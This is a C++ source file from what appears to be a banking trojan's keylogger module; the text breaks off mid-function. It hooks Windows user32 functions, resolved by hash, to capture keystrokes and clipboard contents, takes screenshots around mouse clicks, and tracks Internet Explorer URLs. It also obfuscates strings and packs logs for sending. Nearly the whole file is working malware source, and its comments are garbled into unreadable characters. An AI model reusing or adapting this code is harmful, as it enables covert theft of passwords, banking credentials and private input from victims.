//---------------------------------------------------------------------------

#include "UniversalKeyLogger.h"

#include <Windows.h>
#include <Windowsx.h>


#include "Splice.h"
#include "Loader.h"
#include "CabPacker.h"
#include "ScreenShots.h"
#include "Unhook.h"
#include "BotCore.h"


//---------------------------------------------------------------------------

#include "BotDebug.h"

namespace KEYLOGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define KLGDBG KEYLOGDEBUGSTRINGS::DBGOutMessage<>



//---------------------------------------------------------------------------
const static char URLFileName[] = {'U', 'R', 'L', '.', 't', 'x', 't',  0};


char FieldID[]    = {'i', 'd',  0};
char FieldType[]  = {'t', 'y', 'p', 'e',  0};
char FieldHash[]  = {'h', 'a', 's', 'h',  0};
char FieldSHash[] = {'s', 'h', 'a', 's', 'h',  0};
char FieldLog[]   = {'l', 'o', 'g',  0};

//---------------------------------------------------------------------------

// ��������� �������� ���������� ��������
#define CHAR_CODES_START VK_SPACE



#define KLGFileSignature 0x34F2E7A1
#define KLGFileVersion   16


#define KLGProcListFileSignature 0x56F2E7B2
#define KLGProcListFileVersion   1


// ��������� �������� ������ ���������
#define WM_CLOSEKEYLOGGERSESSION WM_USER + 3333

//----------------------------------------------------
//  ��������� ����� ���� ���������
//----------------------------------------------------
#pragma pack(push, 1)
typedef struct TKLGFileHeader
{
	DWORD Signature;          // ��������� �����
	DWORD Version;            // ������ �����
	bool  Closed;             // ���� ������, �������� ��� �� ���������� ���
	DWORD AppHash;            // ��� ��������
	DWORD PID;                // ������������� ��������
	bool  SendAsCAB;          // ���������� ��� ��� ��� �����
	bool  DontSendLog;        // �� ���������� ��� ������������ �����������
}*PKLGFileHeader;
#pragma pack(pop)


//----------------------------------------------------
//  ��������� ����� � ������� �������� ������
//  �������������� ���������
//----------------------------------------------------
#pragma pack(push, 1)
typedef struct TKLGProcessListHeader
{
	DWORD Signature;  // ��������� �����
	DWORD Version;    // ������ �����

}*PKLGProcessListHeader;
#pragma pack(pop)

//---------------------------------------------------------------------------

// ��������������� ����������� �������
void ProcessAllMessages(PMSG Msg, bool IsUnicode);
void ProcessKeyDownMessage(PMSG Msg);
void ProcessSetTextMessage(PMSG Msg, bool IsUnicode);

void UpdateIEUrl(HWND Wnd, LPVOID Text, bool IsUnicode, bool CheckWND);

void ProcessSetTextMessage(HWND Wnd, DWORD Message, int WParam, int LParam, bool IsUnicode);


//***************************************************************************
//  ���������� ������ ���������
//***************************************************************************
namespace KeyLogger
{
	// ���������
	const static char StrClick[] = "<Click>";


	// ���������� �������� ����
	bool SetActiveWnd(HWND Wnd, DWORD Action);

    // ������������� �������� �������
	bool SetActiveSystem(PKeyLogSystem System);

	// ������� �������������� ��������� �����
    void InitializeFileHeader();

    // ������� ������������� �������� ������
	bool SetActiveFilter(PKeyLogSystem System, PKlgWndFilter Filter);

	// ����������� ����
	bool FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
		PKeyLogSystem * System, PKlgWndFilter * Filter, HWND * ParentWND);

	//  ������� ���������� ������ ���� ����� ������� ������� �������
	bool CanCloseSystem(bool CheckActiveDialogs = true);

    // ������� ��������� ������� ������
    void CloseFilter(bool CloseSystem);

	// ������� ��������� ������� �������
	bool CloseSystem(BOOL ManualClosing);

	// ������� ��������� ����������� ����
	LRESULT WINAPI InternalWndProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam);

	// ������� ����������� ������� �������� ������������
	void IncActionCounter();

	// ������� ������������ ������� �������
	void OnTimer();

	// ������� ������ ������ ������ � ���������� ��� � ����
	void MakeScreenShot();

	// ������� ���������� ������ ��������� �������� �������
	void ResetFiltersStatus(PKeyLogSystem S);

	// ������� �������������� ��������� ����
	void InitializeInternalWND();

	//  ������ ������������� ��������� ���� �� �����
	//  ���������. ����� ��������� ����� ������� � ��������
	DWORD inline TicksToKLGTime(DWORD T) {return T / 1000;}

	// ������� ���������� ������ ���� � ������� ������� ��� �������
	bool CheckDialogs();

	// ������� ��������� ��� �� ����������� (������������)
	// ������� ���� ������������
	bool CheckAllFiltersActivated();

	// ������� ���������� ������ ���� ������� �������� ������ �������
	bool IsDialogsSystem();

	// ������� ����� ��������� ��������
	void DoAfterDispatchMessage(PMSG Msg, bool IsUnicode);

	// ������� ���������� ���� ������
    void UpdateFocusWnd(HWND Wnd);

	// ��������� ����������� ����
	void DoShowWindow(PShowWindowData Data);
	void DoAfterShowWindow(PShowWindowData Data);

}



//***************************************************************************
//---------------------------------------------------------------------------

// ���������� ������ ���������
struct TKeyLoggerInternalData
{
    TKLGFileHeader FileHeader; // ��������� �����
	DWORD ThreadID;          // ����� � ������� ������� ��������
	HWND  InternalWnd;       // ��������� ���� ���������
	HWND  FocusWnd;          // ���� ��������� �������
	HWND  UrlEditWnd;        // ���� ����� ������ � IE
	PCHAR CurrentURL;        // ������� ����� �������� � �������� �������� IE
	DWORD MaxWndParentLevel; // ������������ ������� �������� ������������ ����
	PKeyLogSystem System;    // �������� �������
	PKlgWndFilter Filter;    // �������� ������
	DWORD LastWriteTime;     // ����� ��������� ������ � ����
	DWORD ImageIndex;        // ������ ������� ��������
	bool SystemCompleted;    // ������� ����������
	DWORD ActionsCount;      // ���������� �������� ����������� �������������
	DWORD MaxActions;        // ������������ ���������� ��������, ����� ������� ����� ������� �������
	bool UseActionTimer;     // ������������ ������ �������� �� ��������� ������ ������������
	DWORD StartTime;         // ����� ������� �������
	DWORD LastActionTime;    // ����� ���������� ��������
	bool RemoveSystemAfterCompleted; // ������� ������� ����� ����������
	PList Dialogs;           // ������ �������� ���������� ����
	bool  StopLogging;       // ���������� ��������� ����������� ������
};

//---------------------------------------------------------------------------


PKeyLogger GlobalKeyLogger = NULL; // ���������� ��������
TKeyLoggerInternalData KLG;    // ���������� ������ ���������
DWORD KeyLoggerProcess = 0;        // �������� ��������� � ��������
bool  KeyLoggerApiHooked = false;  // ������� ����, ��� � ������� �������� ��� ��������� ��������


//---------------------------------------------------------------------------
PKeyLogger GetLogger(bool CheckActive)
{
	if (GlobalKeyLogger == NULL || (CheckActive && !GlobalKeyLogger->Active))
		return NULL;
	else
		return GlobalKeyLogger;
}

//---------------------------------------------------------------------------
namespace KeyLoggerHooks
{
	// ���� � ���������� ��� �����
	typedef LRESULT (WINAPI *PDispatchMessage)(MSG *lpMsg);
	typedef BOOL (WINAPI *PSetWindowText)(HWND Wnd, PCHAR String);
    typedef HWND (WINAPI *TSetFocus)(HWND Wnd);
	typedef HANDLE (WINAPI *TGetClipboardData)(UINT uFormat);
	typedef BOOL (WINAPI *TPeekMessage)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
    typedef BOOL (WINAPI *TShowWindow_)(HWND hWnd, int Cmd);
	
	PDispatchMessage Real_DispatchMessageA;
	PDispatchMessage Real_DispatchMessageW;

	PSetWindowText Real_SetWindowTextW;
	PSetWindowText Real_SetWindowTextA;

	TSetFocus Real_SetFocus;

	TGetClipboardData Real_GetClipboardData;
	TShowWindow_ Real_ShowWindow;
	TPeekMessage Real_PeekMessageA;
	TPeekMessage Real_PeekMessageW;

	//---------------------------------------------------------------------------

	HWND WINAPI Hook_SetFocus(HWND Wnd)
	{
    	// ������������ ��������� ������
		KeyLogger::UpdateFocusWnd(Wnd);
		return Real_SetFocus(Wnd);
	} 

	void __ProcessPeekMessage(LPMSG Msg)
	{
		// ������������ ������� ���������� ������
		PKeyLogger Logger = GetLogger(true);
		if (Logger == NULL)
			return;

		if (Msg->message == WM_KEYDOWN)
			ProcessKeyDownMessage(Msg);
    }

	BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
	{
		BOOL Result = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

		if (Result && wRemoveMsg)
		{
            __ProcessPeekMessage(lpMsg);
        }

        return Result;
	}

	BOOL WINAPI Hook_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
	{
		BOOL Result = Real_PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

		if (Result && wRemoveMsg)
		{
            __ProcessPeekMessage(lpMsg);
        }

        return Result;
    }


	LRESULT WINAPI Hook_DispatchMessageA(MSG *lpMsg)
	{
		ProcessAllMessages(lpMsg, false);
		LRESULT R = Real_DispatchMessageA(lpMsg);

	    KeyLogger::DoAfterDispatchMessage(lpMsg, false);

		return R;
	}

	LRESULT WINAPI Hook_DispatchMessageW(MSG *lpMsg)
	{
		ProcessAllMessages(lpMsg, true);
		LRESULT R = Real_DispatchMessageW(lpMsg);

		KeyLogger::DoAfterDispatchMessage(lpMsg, true);

		return R;
	}


	BOOL WINAPI Hook_SetWindowTextW(HWND Wnd, PWCHAR String)
	{
		BOOL Result = Real_SetWindowTextW(Wnd, (PCHAR)String);

		if (Result)
		{
			UpdateIEUrl(Wnd, String, true, true);
		}
		return Result;
	}

	//-----------------------------------------------
	//  ������� ������������ ������� �� ������ ������
	//-----------------------------------------------
	HANDLE WINAPI Hook_GetClipboardData(UINT uFormat)
	{
		HANDLE DataHandle = Real_GetClipboardData(uFormat);


		if( uFormat == CF_TEXT || uFormat == CF_UNICODETEXT)
		{
			// ���������  ���� ��������� �������
			PKeyLogger Logger = GetLogger(true);
			if (!Logger || (!KLG.System && !Logger->NewKeylogger->Active()) )
				return DataHandle;

			KLGDBG("UnKLG", "������������� ������ �� ������ ������. WND = %d ", Logger->ActiveWND);

			PCHAR Data = (PCHAR)pGlobalLock(DataHandle);
			if( uFormat == CF_UNICODETEXT ) //����� � ������� ��������� � ansi
				Data = WSTR::ToAnsi( (WCHAR*)Data, 0 );
			KLGDBG("UnKLG", "���������� ������ �� ������ '%s'", Data);

			// ��������� �� � ���������
			if (Data)
			{
				// �������� ������ � ����� �������
				if (Logger->NewKeylogger->Active())
				{
                	Logger->NewKeylogger->LogClipboard(Data);
                }

				// ��������� � ������
				if (KLG.System)
				{
					KeyLogger::AddStrToBuffer(NULL, Data, 0);
					KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
                }
			}

			if( uFormat == CF_UNICODETEXT )
				STR::Free(Data);

			pGlobalUnlock(DataHandle);
		}
		return DataHandle;
	}



	BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
	{
		// ������������ ������������ ����
		TShowWindowData Data;
		ClearStruct(Data);
		Data.Window = hWnd;
		Data.Command = Cmd;

        KeyLogger::DoShowWindow(&Data);

		BOOL Res = Real_ShowWindow(hWnd, Data.Command);

		KeyLogger::DoAfterShowWindow(&Data);

		return Res;
	}

	//------------------------------------------------------------------------

	bool HookKeyLoggerApi()
	{
		// ������ ���� �� ������ ���
		if (KeyLoggerApiHooked)
			return true;

		PKeyLogger Logger = GetLogger(false);
		if (Logger == NULL)
			return false;


		#define HASH_SETFOCUS     0x6D5F6D57 /* SetFocus */
		#define HASH_PEEKMESSAGEA 0xD7A87C2C /* PeekMessageA */
		#define HASH_PEEKMESSAGEW 0xD7A87C3A /* PeekMessageW */

		const static DWORD HASH_SHOWWINDOW = 0x7506E960; /* ShowWindow */
		const static DWORD Hash_DispatchMessageA = 0x4BAED1C8;
		const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
		const static DWORD Hash_SetWindowTextW = 0x3C29101C;

		const static DWORD Hash_GetClipboardData = 0x8E7AE818;


		if (HookApi(DLL_USER32, Hash_DispatchMessageA, &Hook_DispatchMessageA) )
		{
			__asm mov [Real_DispatchMessageA], eax
		}
		else return false;

		
		if (HookApi(DLL_USER32, Hash_DispatchMessageW, &Hook_DispatchMessageW ) )
		{
			__asm mov [Real_DispatchMessageW], eax
		}
		else return false;
		
		
		if (HookApi(DLL_USER32, HASH_SETFOCUS, &Hook_SetFocus) )
		{
			__asm mov [Real_SetFocus], eax
		}
		else return false;

		if (HookApi(DLL_USER32, HASH_PEEKMESSAGEA, &Hook_PeekMessageA) )
		{
			__asm mov [Real_PeekMessageA], eax
		}
		else return false;

		if (HookApi(DLL_USER32, HASH_PEEKMESSAGEW, &Hook_PeekMessageW) )
		{
			__asm mov [Real_PeekMessageW], eax
		}
		else return false;

		// ��������� ������ ������������� ������ � ��
		if (Logger->Process == PROCESS_IE)
		{
			if (HookApi(DLL_USER32, Hash_SetWindowTextW, &Hook_SetWindowTextW) )
			{
				__asm mov [Real_SetWindowTextW], eax
			}
			else return false;
        }

		if( !HookApi(DLL_USER32, Hash_GetClipboardData, &Hook_GetClipboardData, &Real_GetClipboardData) )
			return false;


		HookApi(DLL_USER32, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);

		KeyLoggerApiHooked = true;
		return true;
	}

//---------------------------------------------------------------------------
} // Key logger HOOKS



//---------------------------------------------------------------------------
LRESULT WINAPI KeyLoggerSubClassingWndProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
{
	// ���������� ������� ���������
	MSG Rec;
	ClearStruct(Rec);
	Rec.hwnd = Wnd;
	Rec.message = Msg;
	Rec.wParam = WParam;
	Rec.lParam = LParam;

	PKeyLogger Logger = GetLogger(true);
	if (Logger != NULL)
	{
		bool IsUnicode = pIsWindowUnicode(Wnd) != 0;
		if (Msg == WM_KEYDOWN)
			ProcessAllMessages(&Rec, IsUnicode);

		return SubClassing::CallOriginalProc(Logger->WndProcList, Wnd, Msg, WParam, LParam);
	}
	return 0;
}

//---------------------------------------------------------------------------
LRESULT WINAPI KeyLogger::InternalWndProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
{
	// ������� ��������� ���������� ����
	if (Msg == WM_CLOSEKEYLOGGERSESSION)
	{
		// �������� ��������� �������� �������
		KLGDBG("UnKLG", "�������� ���������� � ������������� �������� �������");
		CloseSystem(WParam);
		return 0;
	}

	if (Msg == WM_TIMER)
	{
		KeyLogger::OnTimer();
		return 0;
    }

	return (LRESULT)pDefWindowProcA(Wnd, Msg, WParam, LParam);
}

//---------------------------------------------------------------------------

//--------------------- ������ ��� ������ � ��������� ��������� ------------------------------


void KeyLogger::IncActionCounter()
{
	// ����������� ������� ��������
	if (KLG.System == NULL)
		return;

	KLG.ActionsCount++;
	KLG.LastActionTime = (DWORD)pGetTickCount();

	if (KLG.MaxActions != 0 && KLG.ActionsCount >= KLG.MaxActions)
	{
		/* TODO :
			��������� ������ �������� ��� ���������� �������������
			���������� �������� */
		CloseSession();
    }

}
//----------------------------------------------------------------------------


// ��������� �������� ������������ ������������ �������

typedef struct TKLGEventHandlerItem
{
	TKeyLoggerEventHandler Handler;
	DWORD EventID;

} *PKLGEventHandlerItem;


void FreeEventHandlerItem(LPVOID Item)
{
	if (Item != NULL)
		FreeStruct(Item);
}

void KeyLogger::CallEvent(DWORD EventID, LPVOID Data)
{
	// �������� ������� ���������
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL)
		return;

	// ���� ������������ � �������� ������� �� ������� ����, ���
	// �������� �������� ����� ����� ������������ �����������
	// �� ���������� �� ���������
	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
	{
		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
		if (Item == NULL)
			continue;

		if (Item->EventID == 0 || Item->EventID == EventID)
			Item->Handler(Logger, EventID, Data);
	}
}

//---------------------------------------------------------------------------

void KeyLogger::StopLogging()
{
	// ������� ������������� ����������� � ������� �������
	KLG.StopLogging = true;
}

//---------------------------------------------------------------------------

bool KeyLogger::IsWindowDialog(HWND Wnd)
{
	// ������� ���������� ������ ���� ���� Wnd ��������
	// ���������� ����� �� ������ �������� ���������
	if (KLG.Dialogs == NULL)
		return false;

	for (DWORD i = 0; i < List::Count(KLG.Dialogs); i++)
	{
		PKlgWndFilter Filter = (PKlgWndFilter)List::GetItem(KLG.Dialogs, i);
		if (Filter == NULL)
			return false;
		if (Filter->DialogWnd == Wnd)
        	return true;
	}
	return false;

}

//---------------------------------------------------------------------------
void KeyLogger::DoAfterDispatchMessage(PMSG Msg, bool IsUnicode)
{
	// ������� ����� ��������� ��������
	PKeyLogger L = GetLogger(true);
	if (L == NULL)
		return;

	if (KLG.System != NULL && KLG.System->OnAfterDispatchMessage != NULL)
		KLG.System->OnAfterDispatchMessage(KLG.System, Msg, IsUnicode);
}
//---------------------------------------------------------------------------

// ������� ���������� ���� ������
void KeyLogger::UpdateFocusWnd(HWND Wnd)
{
	if (KLG.FocusWnd != Wnd)
	{
		KLG.FocusWnd = Wnd;
		KeyLogger::CallEvent(KLE_FOCUS_CHANGED, &KLG.FocusWnd);
    }
}


//---------------------------------------------------------------------------

void KeyLogger::DeleteAllTextData(HWND Wnd)
{
	//  ������� ������� ��� ��������� ������ �� �������� ����
	//  ����, ��� �������� ����� ������� ������.
	//  ��� �� �������, �� ����� ������� ��� ��������� ������

	PKeyLogger L =GetLogger(true);
	if (L == NULL || L->FileName == NULL)
		return;

    WriteToFile(Wnd, NULL, KEYLOGGER_DELETE_TEXT_DATA, NULL, 0);
}

//---------------------------------------------------------------------------

struct TNonPrintChar
{
	WCHAR Code;
	PCHAR Text;
};

TNonPrintChar NonPrintChars[] = {
									{VK_RETURN, "\r\n"   },
									{VK_BACK,   "{Back}" },
									{VK_DELETE, "{Del}"  },
									{VK_LEFT,   "{Left}" },
									{VK_RIGHT,  "{Right}"},
									{VK_UP,     "{Up}"   },
									{VK_DOWN,   "{Down}" },
									{VK_TAB,    "{Tab}"  },
									{0, NULL}
								};


//-----------------------------------------------
//  ������� ���������� ����� ����������� �������
//-----------------------------------------------
bool GetNonPrintCharText(DWORD Char, PCHAR &Buf)
{
	// ������� ���������� ����� ��� ����������� �������
	Buf = NULL;

	for (int i = 0; NonPrintChars[i].Code != 0; i++)
		if (NonPrintChars[i].Code == Char)
		{
			Buf = NonPrintChars[i].Text;
			return true;
		}
	return false;
}


void ProcessCharMessage2(HWND Wnd, PCHAR KeyText, bool IncCounter)
{
	// ���������� ����������� ������� WM_CHAR
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL) return;

	// ���������� ��������� ����
	if (!pIsWindowVisible(Wnd)) return;

	// ��������� ���� � ����� ��������
	Logger->NewKeylogger->LogKeyboard(Wnd, KeyText);
	// ��������� � ������ ������
	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, KeyText);


	// ������������� �������� ����
	if (Logger->ActiveWND != Wnd)
	{
		if (!KeyLogger::SetActiveWnd(Wnd, LOG_KEYBOARD))
        	return;
	}

	if (KLG.StopLogging) return;

	KLGDBG("UnKLG", "���� - %s", KeyText);


	KeyLogger::AddStrToBuffer(NULL, KeyText, 0);

	if (IncCounter)
		KeyLogger::IncActionCounter();

}
//---------------------------------------------------------------------------

void ProcessCharMessage(PMSG Msg, bool IsUnicode)
{
	PKeyLogger Logger = GetLogger(false);
	if (!Logger) return;

    bool IncCounter = false;
	PCHAR Buf = NULL;
	char keyChar[2];

	if (!GetNonPrintCharText(Msg->wParam, Buf))
	{
		// ��������� ������������� ����������� �������
		if (Msg->wParam < CHAR_CODES_START)
			return;


		// �������������� �������� ������
		IncCounter = true;
		if( IsUnicode )
		{
			wchar_t keyWChar[2];
			keyWChar[0] = Msg->wParam;
			keyWChar[1] = 0;
			pWideCharToMultiByte( 1251, 0, keyWChar, 1, keyChar, 1, 0, 0 );
		}
		else
			keyChar[0] = Msg->wParam;
    }

	if (!Buf)
	{
		keyChar[1] = 0;
		Buf = keyChar;
	}

	ProcessCharMessage2(Msg->hwnd, Buf, IncCounter);
}

void ProcessKeyDownMessage(PMSG Msg)
{
	// ��������� ��������� ������� ������ ����������

	// ��������� ������������� ��������� ������� ������ �������
	// �������� � ��������� ������� ������ ��� ��������� ���������
	// ��������� ��������

	const static DWORD SupportChars[] =
		{VK_TAB, VK_DELETE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, 0};

	PCHAR Buf = NULL;
	for (int i = 0; SupportChars[i] != 0; i++)
		if (SupportChars[i] == Msg->wParam)
		{
			//�������� ������� ��� ��������� ��������
			GetNonPrintCharText(Msg->wParam, Buf);
			break;
        }


	if (Buf)
		ProcessCharMessage2(Msg->hwnd, Buf, false);
}
//---------------------------------------------------------------------------

void ProcessMouseMessage(PMSG Msg)
{
	// ������������ ��������� ����

	PKeyLogger Logger = GetLogger(true);

	// �������� ������ ����� ������ ����
	if (Logger == NULL || (Msg->wParam & MK_LBUTTON) == 0)
		return;

	int AlwaysLogMouse = KLG.System ? KLG.System->AlwaysLogMouse : 0;
	// ��������� ������������� ������ ������
	if ((Msg->hwnd == Logger->ActiveWND && KLG.Filter) || AlwaysLogMouse)
	{
		bool LogClick = AlwaysLogMouse == LOG_MOUSE_NOT_SCREENSHOT || (KLG.Filter->LogClicks && ((KLG.Filter->Actions & LOG_MOUSE) == 0));
		if (LogClick)
		{
       		if (!KLG.StopLogging)
				KeyLogger::AddStrToBuffer(NULL, (PCHAR)KeyLogger::StrClick, 0);
			return;
		}
	}

	// ������������ ������� ������

	bool ValidWnd = KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE);
	char* text = GetWndText(Msg->hwnd);


	if (!ValidWnd || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging || AlwaysLogMouse == 0)
	{
		KeyLogger::IncActionCounter();
		return;
	}

	// ���������� ���������� �������
	DWORD Width  = KLG.Filter->Data.SSWidth;
	DWORD Height = KLG.Filter->Data.SSHeight;

	if (Width == NULL)  Width  = DEFAULT_SCREENSHOT_WIDTH;
	if (Height == NULL) Height = DEFAULT_SCREENSHOT_HEIGHT;

	POINT PT;
	PT.x = GET_X_LPARAM(Msg->lParam);
	PT.y = GET_Y_LPARAM(Msg->lParam);


	pClientToScreen(Msg->hwnd, &PT);

	// ������ ��������
	TDrawCursorInfo CD;
	CD.Mode = 0;
	CD.X = PT.x;
	CD.Y = PT.y;
	CD.PointWidth = 4;
	CD.Color = KLG.Filter->Data.CursorColor;
	if (CD.Color == 0)
		CD.Color = COLOR_RED;

	PT.x -= Width / 2;
	PT.y -= Height / 2;

	LPBYTE Shot;
	DWORD  Size;
	if (ScreenShot::MakeToMem(NULL, PT.x, PT.y, Width, Height, &CD, Shot, Size))
	{
		KLGDBG("UnKLG", "��������� ������ ������� ������ ����");
		HWND LogWnd = NULL;

		// ����������� ���� ��� ���������� ����
		if (KLG.Filter->OnGetLogWnd)
			KLG.Filter->OnGetLogWnd(KLG.Filter, LogWnd);

		if (LogWnd == NULL)
		{
			switch (KLG.Filter->MouseLogWnd) {
				case MOUSE_LOG_WND_ACTIVE: LogWnd = Msg->hwnd; break;
				case MOUSE_LOG_WND_FOCUS:  LogWnd = (HWND)pGetFocus(); break;
				case MOUSE_LOG_WND_FILTER: LogWnd = (HWND)KLG.Filter; break;  // ����� ���������, ��� � ���� ������ ��������� ���� � ����� wnd
			}
        }

		KeyLogger::AddScreenShot(LogWnd, !KLG.Filter->Data.DontShowSSInStr, Shot, Size);
		MemFree(Shot);
	}

    KeyLogger::IncActionCounter();
}

//---------------------------------------------------------------------------

bool CompareWndClassNames(HWND Wnd, PCHAR *Names)
{
	// ������� ���������� �������� ��� �������
	if (Wnd == NULL || Names == NULL || *Names == NULL)
		return false;

	const static DWORD Len = 50;
	char ClassName[Len + 1];


	while (Wnd != NULL && *Names != NULL)
	{
		ClassName[0] = 0;
		pGetClassNameA(Wnd, ClassName, Len);

		if (!StrSame(*Names, ClassName, true))
		{
			return false;
        }

		Wnd = (HWND)pGetParent(Wnd);
		Names++;
	}
	/* ����� ������ � ������ ���������� ���� ��� */
	return *Names == NULL;
}



bool IsIEAdressBar(HWND Wnd)
{
	// ������� ���������� ������ ����
	// ����� ���� ������������� ������ ���� �������� ������
	// �������� ����������


	if (KLG.UrlEditWnd != NULL)
		return KLG.UrlEditWnd == Wnd;


	const static char Edit[]          = {'E', 'd', 'i', 't',  0};
	const static char ComboBox[]      = {'C', 'o', 'm', 'b', 'o', 'B', 'o', 'x',  0};
	const static char ComboBoxEx32[]  = {'C', 'o', 'm', 'b', 'o', 'B', 'o', 'x', 'E', 'x', '3', '2',  0};
	const static char ReBarWindow32[] = {'R', 'e', 'B', 'a', 'r', 'W', 'i', 'n', 'd', 'o', 'w', '3', '2',  0};
	const static char WorkerW[]       = {'W', 'o', 'r', 'k', 'e', 'r', 'W',  0};
	const static char IEFrame[]       = {'I', 'E', 'F', 'r', 'a', 'm', 'e',  0};

	const static char AddressBandRoot[] = {'A', 'd', 'd', 'r', 'e', 's', 's', ' ', 'B', 'a', 'n', 'd', ' ', 'R', 'o', 'o', 't',  0};

    // �������� ��� ������� ��6
	const static PCHAR IE6Names[] = {
					(PCHAR)Edit,
					(PCHAR)ComboBox,
					(PCHAR)ComboBoxEx32,
					(PCHAR)ReBarWindow32,
					(PCHAR)WorkerW,
					(PCHAR)IEFrame,
					NULL};

	const static PCHAR IE7Names[] = {
					(PCHAR)Edit,
					(PCHAR)ComboBox,
					(PCHAR)ComboBoxEx32,
					(PCHAR)AddressBandRoot,
					(PCHAR)ReBarWindow32,
					(PCHAR)WorkerW,
					(PCHAR)IEFrame,
					NULL};

	const static PCHAR IE8Names[] = {
					(PCHAR)Edit,
					(PCHAR)AddressBandRoot,
					(PCHAR)ReBarWindow32,
					(PCHAR)WorkerW,
					(PCHAR)IEFrame,
					NULL};


	bool Result = CompareWndClassNames(Wnd, (PCHAR*)&IE8Names[0]) ||
				  CompareWndClassNames(Wnd, (PCHAR*)&IE7Names[0]) ||
				  CompareWndClassNames(Wnd, (PCHAR*)&IE6Names[0]);
	// ��������� ����� ����
	if (Result)
	    KLG.UrlEditWnd = Wnd;

	return  Result;
}


void UpdateIEUrl(HWND Wnd, LPVOID Text, bool IsUnicode, bool CheckWND)
{
	// ������� �������� ����� ��������� � ������ ����� ������ ��
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL || Text == NULL) return;

	if (CheckWND)
	{
		if (!IsIEAdressBar(Wnd)) return;
    }


	// ��������� ������ �����
	PCHAR OldURL = KLG.CurrentURL;
	KLG.CurrentURL = NULL;

	// �������� �����
	if (IsUnicode)
		KLG.CurrentURL = WSTR::ToAnsi((PWCHAR)Text, 0);
	else
		KLG.CurrentURL = STR::New((PCHAR)Text);

	// ��������� ������ ��� ���������
	if (!StrSame(KLG.CurrentURL, "http://", true, 7) &&
		!StrSame(KLG.CurrentURL, "https://", true, 8))
	{
		STR::Free2(KLG.CurrentURL);
	}

	// ���������� �� ��������� ������
    // ���������� ������ � ����� �����
	if (!StrSame(KLG.CurrentURL, OldURL, true, 0))
	{
        KLGDBG("UnKLG", "�������� �������� ��� IE %s", KLG.CurrentURL);
		KeyLogger::CallEvent(KLE_IE_URL_CHANGED, KLG.CurrentURL);
	}

    STR::Free(OldURL);
}
//----------------------------------------------------------------------------

BOOL CALLBACK KeyLoggerEnumJavaAdressBar(HWND Wnd, LONG Data)
{
    // ������� �������� �������� ���� ��� ��� ��������
	HWND *W = (HWND *)Data;
	if (*W != NULL)
		return FALSE;

	if (IsIEAdressBar(Wnd))
	{
		*W = Wnd;
		return FALSE;
	}


    pEnumChildWindows(Wnd, KeyLoggerEnumJavaAdressBar, Data);

    return TRUE;
}

HWND KeyLoggerSearchAddressBarWND()
{
	// ������� ���� ���� �������� ������ ��
	if (KLG.UrlEditWnd != NULL)
	{
		if (KLG.UrlEditWnd == INVALID_HANDLE_VALUE)
			return NULL;
		else
            return KLG.UrlEditWnd;
	}

	// ���������� ����� ������ ����
	HWND Parent;

	if (KLG.FocusWnd == NULL)
		KLG.FocusWnd = (HWND)pGetFocus();
	HWND Wnd = KLG.FocusWnd;


	if (Wnd == NULL)
		return NULL;

	do
	{
		Parent = (HWND)pGetParent(Wnd);
		if (Parent == NULL)
			break;
        Wnd = Parent;
	}
	while (Parent != NULL);
		

	// �������� ������� ����
	HWND Result = NULL;

	pEnumChildWindows(Wnd, KeyLoggerEnumJavaAdressBar, (LONG)&Result);

	if (Result == NULL)
	{
		// �� ������� ����� ���� ����� ������. ��������, ��� ��� ��
		// ������� � ��� �����������. �� ��������� ������ ������ ��������
		// ��� ��������� ������, �������� ���� ��� ����������
        KLG.UrlEditWnd = (HWND)INVALID_HANDLE_VALUE;
	}
	else
        KLG.UrlEditWnd = Result;

	return Result;

}
//----------------------------------------------------------------------------

PCHAR GetURLFromJavaProcess()
{
	// ������� ���������� ������� ��� � �������� ��� ����������� �� �������� ��
	STR::Free2(KLG.CurrentURL);

	HWND Wnd = KeyLoggerSearchAddressBarWND();
	if (Wnd == NULL)
		return NULL;

    KLG.CurrentURL = GetWndText(Wnd);

	return KLG.CurrentURL;
}
//----------------------------------------------------------------------------


void ProcessSetTextMessage(HWND Wnd, DWORD Message, int WParam, int LParam, bool IsUnicode)
{
	MSG Msg;
	ClearStruct(Msg);

	Msg.hwnd = Wnd;
	Msg.message = Message;
	Msg.wParam = WParam;
	Msg.lParam = LParam;
	ProcessSetTextMessage(&Msg, IsUnicode);
}
//---------------------------------------------------------------------------

void ProcessSetTextMessage(PMSG Msg, bool IsUnicode)
{
	// ������������ ��������� WM_SETTEXT

	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL) return;

    UpdateIEUrl(Msg->hwnd, (LPVOID)Msg->lParam, IsUnicode, true);
}
//---------------------------------------------------------------------------

void ProcessClipBoardMessage(PMSG Msg, PKeyLogger Logger)
{
	// ������������ ��������� ������� ������ �� ������ ������
	if (Msg->hwnd != Logger->ActiveWND)
		return;

	//  ��������� ����������� ������� � ������ ������
	if (!pIsClipboardFormatAvailable(CF_TEXT))
		return;

	// ��������� ����� ������
